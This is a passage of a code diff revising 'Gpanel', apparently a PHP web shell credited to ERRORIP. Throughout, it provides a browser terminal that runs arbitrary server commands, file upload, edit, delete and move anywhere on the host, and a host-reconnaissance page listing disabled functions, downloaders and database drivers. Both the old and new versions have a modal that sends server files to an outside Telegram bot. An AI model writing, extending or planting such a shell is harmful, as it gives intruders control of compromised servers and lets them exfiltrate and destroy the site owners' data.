-                        if(file_exists($p)){
-                            if(unlink($p)){
-                                echo "<p style=\"color:#4da6ff;text-align:center;\">Deleted.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
+                case 'unzip':
+                    if (isset($_GET['file'])) {
+                        $file = g1($_GET['file']);
+                        $path = $_d . '/' . $file;
+                        if (file_exists($path) && pathinfo($path, PATHINFO_EXTENSION) == 'zip') {
+                            $zip = new ZipArchive;
+                            if ($zip->open($path) === TRUE) {
+                                $zip->extractTo($_d);
+                                $zip->close();
+                                echo "<p style='color:#4da6ff;'>File unzipped successfully.</p>";
                             } else {
-                                echo "<p style=\"color:#ff4d4d;text-align:center;\">Delete error.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
+                                echo "<p style='color:#ff4d4d;'>Failed to unzip the file.</p>";
                             }
                         } else {
-                            echo "<p style=\"color:#ff4d4d;text-align:center;\">Not found.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
+                            echo "<p style='color:#ff4d4d;'>File is not a valid zip archive.</p>";
                         }
-                    } else {
-                        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
                     }
+                    echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>';
                     break;
-                case 'rename':
-                    if(isset($_GET['file'])){
-                        $x=stripslashes($_GET['file']);
-                        echo "<h2>Rename: $x</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                        echo '<form method="post">New Name: <input type="text" name="new_name" required><input type="submit" name="rn" value="Rename"></form>';
-                        if(isset($_POST['rn'])){
-                            $nn=g1($_POST['new_name']);
-                            $op=$_d."/".$x;
-                            $np=$_d."/".$nn;
-                            if(rename($op,$np)){
-                                echo "<p style=\"color:#4da6ff;text-align:center;\">Renamed.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                            } else {
-                                echo "<p style=\"color:#ff4d4d;text-align:center;\">Rename error.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                            }
-                        }
-                    } else {
-                        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                    }
-                    break;
-                case 'move':
-                    if(isset($_GET['file'])){
-                        $x=stripslashes($_GET['file']);
-                        echo "<h2>Move: $x</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                        echo '<form method="post">Target Dir: <input type="text" name="target_dir" value="'.htmlspecialchars($_d).'" required><input type="submit" name="mv" value="Move"></form>';
-                        if(isset($_POST['mv'])){
-                            $td=g1($_POST['target_dir']);
-                            $op=$_d."/".$x;
-                            $np=$td."/".$x;
-                            if(rename($op,$np)){
-                                echo "<p style=\"color:#4da6ff;text-align:center;\">Moved.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                            } else {
-                                echo "<p style=\"color:#ff4d4d;text-align:center;\">Move error.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                            }
-                        }
-                    } else {
-                        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                    }
-                    break;
-                case 'compress':
-                    if(isset($_GET['file'])){
-                        $x=stripslashes($_GET['file']);
-                        $p=$_d."/".$x;
-                        $z=$_d."/".$x.".zip";
-                        $za=new ZipArchive;
-                        if($za->open($z,ZipArchive::CREATE)===TRUE){
-                            $za->addFile($p,$x);
-                            $za->close();
-                            echo "<p style=\"color:#4da6ff;text-align:center;\">Compressed.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                        } else {
-                            echo "<p style=\"color:#ff4d4d;text-align:center;\">Compress error.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                        }
-                    } else {
-                        echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                    }
-                    break;
-                default:
-                    echo "<p style=\"color:#ff4d4d;text-align:center;\">Invalid action.</p><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
+                case 'delete_single': if(isset($_GET['file'])){ $p = $_d."/".g1($_GET['file']); if(file_exists($p)){ if(recursive_delete($p)) echo "<p style='color:#4da6ff;'>Deleted.</p>"; else echo "<p style='color:#ff4d4d;'>Delete error.</p>"; } } echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>'; break;
+                case 'delete_selected': if (isset($_POST['files']) && is_array($_POST['files'])) { $all_deleted = true; foreach($_POST['files'] as $file) { $p = $_d . '/' . g1($file); if (file_exists($p)) { if (!recursive_delete($p)) $all_deleted = false; } } if($all_deleted) echo "<p style='color:#4da6ff;'>Selected items deleted.</p>"; else echo "<p style='color:#ff4d4d;'>Error deleting some items.</p>"; } echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>'; break;
+                case 'move_selected': if (isset($_POST['files']) && is_array($_POST['files']) && isset($_POST['destination'])) { $all_moved = true; $dest = g1($_POST['destination']); if (is_dir($dest)) { foreach($_POST['files'] as $file) { $old = $_d . '/' . g1($file); $new = $dest . '/' . g1($file); if (file_exists($old)) { if (!rename($old, $new)) $all_moved = false; } } if($all_moved) echo "<p style='color:#4da6ff;'>Selected items moved.</p>"; else echo "<p style='color:#ff4d4d;'>Error moving some items.</p>"; } else { echo "<p style='color:#ff4d4d;'>Invalid destination directory.</p>"; } } echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>'; break;
+                case 'compress_single': case 'compress_selected': $is_multi_download = $_a === 'compress_selected'; if (isset($_GET['file'])) $_POST['files'] = [$_GET['file']]; if (isset($_POST['files']) && is_array($_POST['files']) && count($_POST['files']) > 0) { $files_to_zip = $_POST['files']; $zip_filename = 'gpanel_archive_' . time() . '.zip'; $zip_path = $_d . '/' . $zip_filename; $zip = new ZipArchive(); if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) die("Error creating ZIP."); foreach($files_to_zip as $file_or_folder) { $path = $_d . '/' . g1($file_or_folder); if(!file_exists($path)) continue; if(is_dir($path)) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($files as $name => $file) { if (!$file->isDir()) { $filePath = $file->getRealPath(); $relativePath = g1($file_or_folder) . '/' . substr($filePath, strlen($path) + 1); $zip->addFile($filePath, $relativePath); } } } else $zip->addFile($path, g1($file_or_folder)); } $zip->close(); if ($is_multi_download) { header('Content-Type: application/zip'); header('Content-Disposition: attachment; filename="' . basename($zip_path) . '"'); header('Content-Length: ' . filesize($zip_path)); readfile($zip_path); unlink($zip_path); exit; } else echo "<p style='color:#4da6ff;'>Compressed to $zip_filename.</p><a href='?page=home&dir=".urlencode($_d)."' class='btn'>Back</a>"; } else echo "<p style='color:#ff4d4d;'>No files selected.</p><a href='?page=home&dir=".urlencode($_d)."' class='btn'>Back</a>"; break;
+                default: echo "<p style='color:#ff4d4d;'>Invalid action.</p><a href='?page=home&dir=".urlencode($_d)."' class='btn'>Back</a>";
             }
         } else {
-            if($_p==='upload'){
-                echo "<h2>Upload File</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                echo '<form action="" method="post" enctype="multipart/form-data">Select file: <input type="file" name="file_to_upload"><br>Target: <input type="text" name="target_dir" value="'.htmlspecialchars($_d).'" placeholder="Enter target directory">';
-                echo '<br><input type="submit" name="upload_file" value="Upload"></form>';
-                if(isset($_POST['upload_file'])){
-                    $td=g1($_POST['target_dir']);
-                    g5($td,$_FILES['file_to_upload']);
-                }
-            } elseif($_p==='terminal'){
-                echo "<h2>Terminal</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                echo '<div id="terminal-container"><div id="terminal"></div></div><div id="terminal-input-container"><input type="text" id="termInput" placeholder="Enter command"><button id="sendBtn">Send</button></div>';
-            } elseif($_p==='info'){
-                $uname=php_uname();
-                $uid=function_exists("posix_getuid")?posix_getuid():"N/A";
-                $user_info=function_exists("posix_getpwuid")?posix_getpwuid(posix_getuid()):array();
-                $username=isset($user_info["name"])?$user_info["name"]:"N/A";
-                $gid=function_exists("posix_getgid")?posix_getgid():"N/A";
-                $group_info=function_exists("posix_getgrgid")?posix_getgrgid(posix_getgid()):array();
-                $groupname=isset($group_info["name"])?$group_info["name"]:"N/A";
-                $php_version=phpversion();
-                $safe_mode=ini_get("safe_mode")?"ON":"OFF";
-                $server_ip=$_SERVER["SERVER_ADDR"]??"N/A";
-                $remote_ip=$_SERVER["REMOTE_ADDR"]??"N/A";
-                $date_time=date("Y-m-d H:i:s");
-                $domains="Cant Read [ /etc/named.conf ]";
-                $hdd_total=disk_total_space($_SERVER["DOCUMENT_ROOT"]??__DIR__);
-                $hdd_free=disk_free_space($_SERVER["DOCUMENT_ROOT"]??__DIR__);
-                $hdd_total_gb=round($hdd_total/(1024*1024*1024),2)." GB";
-                $hdd_free_gb=round($hdd_free/(1024*1024*1024),2)." GB";
-                $hdd_percent=$hdd_total>0?round(($hdd_free/$hdd_total)*100):0;
-                $useful="gccccldmakephpperlrubytargzip";
-                $downloader=(function_exists("curl_init")?"curl":"").((function_exists("shell_exec")&&stripos(shell_exec("which wget"),"wget")!==false)?"|wget":"");
-                $downloader=$downloader?$downloader:"None";
-                $disable_functions=ini_get("disable_functions");
-                $curl=extension_loaded("curl")?"ON":"OFF";
-                $ssh2=extension_loaded("ssh2")?"ON":"OFF";
-                $magic_quotes=(function_exists("get_magic_quotes_gpc")&&get_magic_quotes_gpc())?"ON":"OFF";
-                $mysql=function_exists("mysql_connect")?"ON":"OFF";
-                $mssql=function_exists("mssql_connect")?"ON":"OFF";
-                $postgresql=function_exists("pg_connect")?"ON":"OFF";
-                $oracle=function_exists("oci_connect")?"ON":"OFF";
-                $cgi_status="ON";
-                $software=$_SERVER["SERVER_SOFTWARE"]??"N/A";
-                $pwd=getcwd();
-                echo "<h2>Host Information</h2><a id=\"back\" href=\"?dir=".urlencode($_d)."\">Back</a>";
-                echo '<div class="info-box"><table>';
-                echo "<tr><th>Uname</th><td>$uname</td></tr>";
-                echo "<tr><th>User</th><td>$uid [ $username ] Group: $gid [ $groupname ]</td></tr>";
-                echo "<tr><th>PHP</th><td>$php_version Safe Mode: $safe_mode</td></tr>";
-                echo "<tr><th>ServerIP</th><td>$server_ip The Netherlands Your IP: $remote_ip</td></tr>";
-                echo "<tr><th>DateTime</th><td>$date_time</td></tr>";
-                echo "<tr><th>Domains</th><td>$domains</td></tr>";
-                echo "<tr><th>HDD</th><td>Total: $hdd_total_gb Free: $hdd_free_gb [$hdd_percent%]</td></tr>";
-                echo "<tr><th>Useful</th><td>$useful</td></tr>";
-                echo "<tr><th>Downloader</th><td>$downloader</td></tr>";
-                echo "<tr><th>Disable Functions</th><td>$disable_functions</td></tr>";
-                echo "<tr><th>CURL</th><td>$curl</td></tr>";
-                echo "<tr><th>SSH2</th><td>$ssh2</td></tr>";
-                echo "<tr><th>Magic Quotes</th><td>$magic_quotes</td></tr>";
-                echo "<tr><th>MySQL</th><td>$mysql</td></tr>";
-                echo "<tr><th>MSSQL</th><td>$mssql</td></tr>";
-                echo "<tr><th>PostgreSQL</th><td>$postgresql</td></tr>";
-                echo "<tr><th>Oracle</th><td>$oracle</td></tr>";
-                echo "<tr><th>CGI</th><td>$cgi_status</td></tr>";
-                echo "<tr><th>Open_basedir</th><td>".ini_get("open_basedir")."</td></tr>";
-                echo "<tr><th>Safe_mode_exec_dir</th><td>".ini_get("safe_mode_exec_dir")."</td></tr>";
-                echo "<tr><th>Safe_mode_include_dir</th><td>".ini_get("safe_mode_include_dir")."</td></tr>";
-                echo "<tr><th>SoftWare</th><td>$software</td></tr>";
-                echo "<tr><th>PWD</th><td>$pwd [ Home Shell ]</td></tr>";
-                echo "</table></div>";
-            } else {
-                echo "<h2>Directory: ".$_d."</h2>";
-                echo g2($_d);
-                $pd=dirname($_d);
-                echo '<a id="back" href="?dir='.urlencode($pd).'">Back</a>';
-                echo "<h3>Folder:</h3>";
-                g3($_d);
-                echo '<hr><h3>Create New Folder:</h3><form action="" method="post">New Folder: <input type="text" name="folder_name"><input type="submit" name="create_folder" value="Create"></form>';
-                if(isset($_POST['create_folder'])){
-                    g4($_d,$_POST['folder_name']);
-                }
+            switch($_p){
+                case 'edit': case 'view':
+                    if(isset($_GET['file'])){
+                        $file = g1($_GET['file']); $path = $_d . "/" . $file;
+                        if(file_exists($path) && is_file($path)){
+                            echo "<h2>".ucfirst($_p).": ".htmlspecialchars($file)."</h2>"; echo g2_breadcrumb($_d); echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn" style="margin-bottom:1rem;">Back</a>';
+                            if ($_p === 'edit') g6_edit_file($path); else echo "<pre style='background:rgb(46,46,46);padding:15px;border-radius:5px;overflow:auto;max-height:70vh;'>".htmlspecialchars(file_get_contents($path))."</pre>";
+                        } else echo "<p style='color:#ff4d4d;'>Not found.</p>";
+                    }
+                    break;
+                case 'rename': case 'move':
+                     if(isset($_GET['file'])){
+                        $file = g1($_GET['file']); $old_path = $_d . "/" . $file;
+                        echo "<h2>".ucfirst($_p).": ".htmlspecialchars($file)."</h2>"; echo g2_breadcrumb($_d);
+                        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                            if($_p === 'rename' && isset($_POST['new_name'])){
+                                $new_path = $_d . "/" . g1($_POST['new_name']);
+                                if(rename($old_path, $new_path)) echo "<p style='color:#4da6ff;'>Renamed.</p>"; else echo "<p style='color:#ff4d4d;'>Rename error.</p>";
+                            } elseif ($_p === 'move' && isset($_POST['target_dir'])) {
+                                $new_path = g1($_POST['target_dir']) . "/" . $file;
+                                if(is_dir(g1($_POST['target_dir'])) && rename($old_path, $new_path)) echo "<p style='color:#4da6ff;'>Moved.</p>"; else echo "<p style='color:#ff4d4d;'>Move error. Invalid directory?</p>";
+                            }
+                             echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn">Back</a>';
+                        } else {
+                            echo '<a href="?page=home&dir='.urlencode($_d).'" class="btn" style="margin-bottom:1rem;">Back</a><form method="post">';
+                            if($_p === 'rename') echo 'New Name: <input type="text" name="new_name" value="'.htmlspecialchars($file).'" required>';
+                            if($_p === 'move') echo 'Target Directory: <input type="text" name="target_dir" value="'.htmlspecialchars($_d).'" required>';
+                            echo '<input type="submit" value="'.ucfirst($_p).'" class="btn"></form>';
+                        }
+                    }
+                    break;
+                case 'upload':
+                    echo "<h2>Upload File</h2>";
+                    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file_to_upload'])) {
+                        g5_upload_file(isset($_POST['target_dir']) ? g1($_POST['target_dir']) : $_d, $_FILES['file_to_upload']);
+                    }
+                    echo '<form method="post" enctype="multipart/form-data">Target: <input type="text" name="target_dir" value="'.htmlspecialchars($_d).'" required><br>Select file: <input type="file" name="file_to_upload" required><br><input type="submit" value="Upload" class="btn"></form>';
+                    break;
+                case 'terminal':
+                     echo '<h2>Terminal</h2><div id="terminal-container" style="height: 60vh; background: #1e1e1e; border-radius: 8px; padding: 1rem; border:1px solid #444; overflow-y:auto; font-family: monospace;"></div>';
+                     break;
+                case 'info':
+                    echo '<h2>Host Information</h2><div style="overflow-x:auto;"><table style="width:100%; border-collapse:collapse;">';
+                    $info = [ 'Uname' => php_uname(), 'PHP Version' => phpversion(), 'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A', 'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'N/A', 'Your IP' => $_SERVER['REMOTE_ADDR'] ?? 'N/A', 'Disk Space' => format_bytes(disk_free_space('/')) . ' Free / ' . format_bytes(disk_total_space('/')) . ' Total' ];
+                    foreach($info as $key => $value){ echo '<tr><th style="padding:10px; border:1px solid #444; text-align:left; background:#333;">'.$key.'</th><td style="padding:10px; border:1px solid #444;">'.$value.'</td></tr>'; }
+                    echo '</table></div>';
+                    break;
+                case 'security':
+                    echo "<h2>Security Settings</h2>";
+                    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                        if (isset($_POST['set_password'])) {
+                            if (!empty($_POST['new_password']) && $_POST['new_password'] === $_POST['confirm_password']) {
+                                $db['locked'] = true; $db['password_hash'] = password_hash($_POST['new_password'], PASSWORD_DEFAULT); save_db($db); $_SESSION['gpanel_logged_in'] = true;
+                                echo "<p style='color:#4da6ff;'>Lock enabled.</p>";
+                            } else echo "<p style='color:#ff4d4d;'>Passwords do not match.</p>";
+                        } elseif (isset($_POST['remove_password'])) {
+                            $db['locked'] = false; $db['password_hash'] = null; save_db($db); unset($_SESSION['gpanel_logged_in']);
+                            echo "<p style='color:#4da6ff;'>Lock disabled.</p>";
+                        }
+                    }
+                    $db = get_db();
+                    if ($db['locked']) echo "<p>Gpanel is locked.</p><form method='post'><button type='submit' name='remove_password' class='btn btn-danger'>Disable Lock</button></form>";
+                    else echo "<p>Gpanel is unlocked.</p><h3>Set password to lock:</h3><form method='post'>New Password: <input type='password' name='new_password' required><br>Confirm: <input type='password' name='confirm_password' required><br><input type='submit' name='set_password' value='Set Password & Lock' class='btn'></form>";
+                    break;
+                default:
+                    echo "<h2>File Manager</h2>"; echo g2_breadcrumb($_d); echo '<a href="?page=home&dir='.urlencode(dirname($_d)).'" class="btn" style="margin-bottom: 20px; display: inline-block; margin-left: 10px;">&larr; Up</a>'; g3_file_manager($_d);
+                    echo '<hr><h3>Create New Folder:</h3><form method="post"><input type="text" name="folder_name" placeholder="Folder name" required><input type="submit" name="create_folder" value="Create" class="btn"></form>';
+                    if (isset($_POST['create_folder'])) g4_create_folder($_d, $_POST['folder_name']);
             }
         }
         ?>
-    </div>
-    <footer style="text-align:center;padding:10px;color:#aaa;">Created By : https://github.com/ERRORIP</footer>
-    <!-- Password Popup (Set Lock) -->
-    <div id="setLockModal" class="modal-overlay">
-        <div class="modal">
-            <span class="close-modal" onclick="closeSetLockModal()">×</span>
-            <h3>Set Lock Password</h3>
-            <input type="password" id="lockPass" placeholder="Password">
-            <input type="password" id="lockPassRep" placeholder="Repeat Password">
-            <button onclick="setLock()">Set Password</button>
         </div>
     </div>
-    <!-- Password Popup (Enter Lock) -->
-    <div id="enterLockModal" class="modal-overlay">
+    <footer style="text-align:center; padding:20px; color:#aaa;">Created By <a href="https://github.com/ERRORIP" target="_blank" style="color:#4da6ff; text-decoration:none;">ERRORIP</a></footer>
+    <div id="downloadModal" class="modal-overlay">
         <div class="modal">
-            <span class="close-modal" onclick="closeEnterLockModal()">×</span>
-            <h3>Enter Password</h3>
-            <input type="password" id="enterLockInput" placeholder="Password">
-            <div id="enterLockError" style="color:#ff4d4d;"></div>
-            <button onclick="enterLock()">Enter</button>
-        </div>
-    </div>
-    <!-- Download / Telegram Popup -->
-    <div id="telegramModal" class="modal-overlay">
-        <div class="modal">
-            <span class="close-modal" onclick="closeTelegramModal()">×</span>
-            <!-- Upper section: Send to Telegram -->
-            <h3>Send File to Telegram</h3>
-            <input type="text" id="telegramToken" placeholder="Bot Token">
-            <input type="text" id="telegramChatId" placeholder="Chat ID">
-            <button id="sendTelegramBtn">Send to Telegram</button>
+            <span class="close-modal" onclick="closeDownloadModal()">×</span>
+            <h3>Download Options</h3>
+            <p id="downloadFileName" style="margin-bottom:15px; font-weight:bold;"></p>
+            <form id="telegramForm" style="display: flex; flex-direction: column; gap: 1rem;">
+                <h4>Send to Telegram</h4>
+                <input type="text" id="telegramToken" placeholder="Bot Token">
+                <input type="text" id="telegramChatId" placeholder="Chat ID">
+                <button type="button" id="sendTelegramBtn" class="btn">Send</button>
+            </form>
             <hr>
-            <!-- Lower section: Download File -->
-            <h3>Download File</h3>
-            <button id="downloadFileBtn">Download</button>
+            <h4>Direct Download</h4>
+            <button id="downloadFileBtn" class="btn">Download</button>
         </div>
     </div>
-    <iframe name="downloadFrame" style="display:none;"></iframe>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/codemirror.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.5/mode/php/php.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/xterm/4.19.0/xterm.min.js"></script>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/meta.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/addon/edit/closebrackets.min.js"></script>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/xml/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/javascript/javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/css/css.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/clike/clike.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/htmlmixed/htmlmixed.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.15/mode/php/php.min.js"></script>
+
     <script>
-        var telegramFile="";
-        function sendToTelegram(f){
-            telegramFile=f;
-            document.getElementById("telegramModal").style.display="flex";
-        }
-        document.getElementById("sendTelegramBtn").addEventListener("click", function(){
-            var t=document.getElementById("telegramToken").value,
-                c=document.getElementById("telegramChatId").value;
-            if(t === "" || c === ""){
-                alert("Both Token and Chat ID are required.");
-                return;
-            }
-            var xhr = new XMLHttpRequest();
-            xhr.onreadystatechange = function(){
-                if(xhr.readyState==4 && xhr.status==200){
-                    alert("File sent to Telegram!");
-                    closeTelegramModal();
+        function matrixEffect(){
+            var c=document.getElementById("matrixCanvas"), ctx=c.getContext("2d");
+            c.height=window.innerHeight; c.width=window.innerWidth;
+            var l="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".split(""), fs=16, cols=c.width/fs, drops=[];
+            for(var i=0;i<cols;i++) drops[i]=1;
+            function d(){
+                ctx.fillStyle="rgba(18,18,18,0.05)"; ctx.fillRect(0,0,c.width,c.height);
+                ctx.fillStyle="#790604"; ctx.font=fs+"px monospace";
+                for(var j=0;j<drops.length;j++){
+                    var t=l[Math.floor(Math.random()*l.length)];
+                    ctx.fillText(t,j*fs,drops[j]*fs);
+                    if(drops[j]*fs>c.height&&Math.random()>0.975) drops[j]=0;
+                    drops[j]++;
                 }
-            };
-            xhr.open("GET","?telegram_download=1&file="+encodeURIComponent(telegramFile)+"&token="+encodeURIComponent(t)+"&chat_id="+encodeURIComponent(c), true);
-            xhr.send();
-        });
-        document.getElementById("downloadFileBtn").addEventListener("click", function(){
-            window.location.href = "?download=1&file=" + encodeURIComponent(telegramFile);
-        });
-        if(document.getElementById("codeEditor")){
-            var ed=CodeMirror.fromTextArea(document.getElementById("codeEditor"), {
-                lineNumbers:true,
-                mode:"text/x-php",
-                theme:"dracula"
-            });
-        }
-        if(document.getElementById("termInput")){
-            document.getElementById("termInput").addEventListener("keydown", function(e){
-                if(e.keyCode===13) sendCommand();
-            });
-        }
-        if(document.getElementById("sendBtn")){
-            document.getElementById("sendBtn").addEventListener("click", function(){
-                sendCommand();
-            });
-        }
-        function sendCommand(){
-            var inp=document.getElementById("termInput"), cmd=inp.value;
-            if(cmd.trim()==="") return;
-            fetch("?tcmd="+encodeURIComponent(cmd))
-                .then(r=>r.text())
-                .then(d=>{
-                    document.getElementById("terminal").innerHTML += "<br>" + d + "<br>$ ";
-                })
-                .catch(err=>{
-                    document.getElementById("terminal").innerHTML += "<br>Error<br>$ ";
-                });
-            inp.value="";
-        }
-        var term = new Terminal({cursorBlink:true, theme:{background:"#1e1e1e", foreground:"#e0e0e0"}});
-        term.open(document.getElementById("terminal"));
-        term.write("Welcome to the Terminal\r\n$ ");
-        function folderOpen(u,e){
-            if(e.target.closest(".dd")) return;
-            window.location.href="?dir="+u;
-        }
-        document.addEventListener("DOMContentLoaded", function(){
-            if(localStorage.getItem("locked")==="true" && localStorage.getItem("lockPassword"))
-                showEnterLockModal();
-            updateLockToggle();
-        });
-        function updateLockToggle(){
-            var lt=document.getElementById("lockToggle");
-            lt.textContent = localStorage.getItem("locked")==="true" ? "Lock On" : "Lock Off";
-        }
-        function showSetLockModal(){
-            document.getElementById("setLockModal").style.display="flex";
-        }
-        function closeSetLockModal(){
-            document.getElementById("setLockModal").style.display="none";
-        }
-        function showEnterLockModal(){
-            document.getElementById("enterLockModal").style.display="flex";
-        }
-        function closeEnterLockModal(){
-            document.getElementById("enterLockModal").style.display="none";
-        }
-        function closeTelegramModal(){
-            document.getElementById("telegramModal").style.display="none";
-        }
-        function toggleLock(){
-            if(localStorage.getItem("locked")==="true"){
-                localStorage.removeItem("locked");
-                localStorage.removeItem("lockPassword");
-                updateLockToggle();
-                alert("Lock disabled.");
-            } else {
-                showSetLockModal();
             }
+            setInterval(d,35);
         }
-        function setLock(){
-            var p=document.getElementById("lockPass").value,
-                r=document.getElementById("lockPassRep").value;
-            if(p === "" || r === ""){
-                alert("Both fields are required.");
-                return;
-            }
-            if(p !== r){
-                alert("Passwords do not match.");
-                return;
-            }
-            localStorage.setItem("lockPassword", p);
-            localStorage.setItem("locked", "true");
-            updateLockToggle();
-            closeSetLockModal();
-            showEnterLockModal();
-        }
-        function enterLock(){
-            var i = document.getElementById("enterLockInput").value;
-            if(i === localStorage.getItem("lockPassword"))
-                closeEnterLockModal();
-            else {
-                document.getElementById("enterLockError").textContent = "Incorrect password.";
-            }
-        }
-        function td(el, ev){
+        matrixEffect();
+
+        function td(el, ev) {
             ev.stopPropagation();
-            var d = el.parentElement;
-            document.querySelectorAll(".dd").forEach(function(dd){
-                if(dd !== d) dd.classList.remove("open");
-            });
-            d.classList.toggle("open");
-        }
-        document.addEventListener("click", function(){
-            document.querySelectorAll(".dd").forEach(function(d){
+            const dd = el.parentElement;
+            const li = dd.closest('li');
+            const wasOpen = dd.classList.contains("open");
+            
+            document.querySelectorAll(".dd").forEach(d => {
                 d.classList.remove("open");
+                d.closest('li').classList.remove('menu-open');
+            });
+
+            if (!wasOpen) {
+                dd.classList.add("open");
+                if (li) li.classList.add('menu-open');
+            }
+        }
+        document.addEventListener("click", () => {
+            document.querySelectorAll(".dd").forEach(d => {
+                d.classList.remove("open");
+                 d.closest('li').classList.remove('menu-open');
             });
         });
+
+        if (document.getElementById("codeEditor")) {
+            const h2 = document.querySelector('h2');
+            let filename = h2 ? (h2.textContent.match(/:\s*(.*)$/)?.[1] || '') : '';
+            const info = CodeMirror.findModeByFileName(filename);
+            
+            CodeMirror.fromTextArea(document.getElementById("codeEditor"), {
+                lineNumbers: true,
+                theme: "dracula",
+                lineWrapping: true,
+                autoCloseBrackets: true,
+                mode: info ? info.mime : 'text/plain'
+            });
+        }
+        
+        const termContainer = document.getElementById('terminal-container');
+        if (termContainer) {
+            termContainer.insertAdjacentHTML('afterend', '<form id="term-form" style="margin-top:10px; display:flex; gap: 0.5rem;"><input type="text" id="termInput" placeholder="Enter command"><button type="submit" class="btn">Send</button></form>');
+            document.getElementById('term-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const termInput = document.getElementById('termInput');
+                const cmd = termInput.value;
+                if (cmd.trim() === "") return;
+                termContainer.innerHTML += `<div><span style="color:#4da6ff;">$</span> ${cmd}</div>`;
+                fetch("?tcmd=" + encodeURIComponent(cmd)).then(r => r.text()).then(d => {
+                    termContainer.innerHTML += `<pre style="white-space: pre-wrap; word-wrap: break-word; margin: 0; padding: 0;">${d}</pre>`;
+                    termContainer.scrollTop = termContainer.scrollHeight;
+                });
+                termInput.value = "";
+            });
+        }
+        
+        const selectAll = document.getElementById('select-all');
+        if (selectAll) {
+            const checkboxes = document.querySelectorAll('.file-checkbox');
+            const multiSelectActions = document.getElementById('multi-select-actions');
+            
+            function toggleActions() {
+                const anyChecked = document.querySelectorAll('.file-checkbox:checked').length > 0;
+                multiSelectActions.style.display = anyChecked ? 'flex' : 'none';
+            }
+            selectAll.addEventListener('change', (e) => { checkboxes.forEach(cb => cb.checked = e.target.checked); toggleActions(); });
+            checkboxes.forEach(cb => cb.addEventListener('change', toggleActions));
+            
+            function createAndSubmitForm(action, extraData = {}) {
+                const selectedFiles = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
+                if (selectedFiles.length === 0) { alert("No items selected."); return; }
+                const form = document.createElement('form');
+                const currentDir = new URLSearchParams(window.location.search).get('dir') || '<?php echo getcwd(); ?>';
+                form.method = 'POST';
+                form.action = `?action=${action}&dir=${encodeURIComponent(currentDir)}`;
+                selectedFiles.forEach(fileName => {
+                    const input = document.createElement('input');
+                    input.type = 'hidden'; input.name = 'files[]'; input.value = fileName;
+                    form.appendChild(input);
+                });
+                for(const key in extraData) {
+                    const input = document.createElement('input');
+                    input.type = 'hidden'; input.name = key; input.value = extraData[key];
+                    form.appendChild(input);
+                }
+                document.body.appendChild(form);
+                form.submit();
+            }
+
+            document.getElementById('compress-selected-btn').addEventListener('click', () => createAndSubmitForm('compress_selected'));
+            document.getElementById('download-selected-btn').addEventListener('click', () => createAndSubmitForm('compress_selected'));
+            document.getElementById('delete-selected-btn').addEventListener('click', () => { if(confirm('Are you sure you want to delete selected items?')) createAndSubmitForm('delete_selected'); });
+            document.getElementById('move-selected-btn').addEventListener('click', () => { 
+                const dest = prompt("Enter destination directory path:", "<?php echo g1($_d); ?>");
